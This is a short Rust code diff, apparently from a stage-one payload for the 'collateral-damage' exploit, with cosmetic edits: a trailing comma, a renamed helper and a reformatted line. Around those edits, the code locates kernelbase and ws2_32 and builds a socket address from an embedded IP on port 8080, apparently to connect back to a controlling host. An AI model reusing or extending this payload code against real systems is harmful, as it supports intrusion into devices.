@@ -44,7 +44,7 @@ const GLOBAL_INFO: u64 = 0x44000000;
 // Reference: https://github.com/exploits-forsale/collateral-damage/blob/f39189558e97c0e3418d7f328604cb66a52dba5b/collat_payload/collat_payload.c#L20C1-L20C78
 #[repr(C)]
 struct COLLAT_INFO {
-    ip_addr: [u8; 0x20]
+    ip_addr: [u8; 0x20],
 }
 
 #[used]
@@ -65,7 +65,7 @@ pub extern "C" fn main() -> u64 {
     let kernelbase_ptr = kernelbase_ptr.unwrap();
 
     // Get WS2 so that we can use sockets
-    let ws2_ptr = get_ws2_32(kernelbase_ptr);
+    let ws2_ptr = fetch_ws2_32(kernelbase_ptr);
     if ws2_ptr.is_none() {
         return STAGE1_WS2_NOT_FOUND;
     }
@@ -141,9 +141,7 @@ pub extern "C" fn main() -> u64 {
             sin_port: u16::from_le_bytes(8080u16.to_be_bytes()),
             sin_addr: IN_ADDR {
                 S_un: windows_sys::Win32::Networking::WinSock::IN_ADDR_0 {
-                    S_addr: (inet_addr)(
-                        collat_info_ref.ip_addr.as_ptr() as *const _,
-                    ),
+                    S_addr: (inet_addr)(collat_info_ref.ip_addr.as_ptr() as *const _),
                 },
             },
             sin_zero: [0u8; 8],
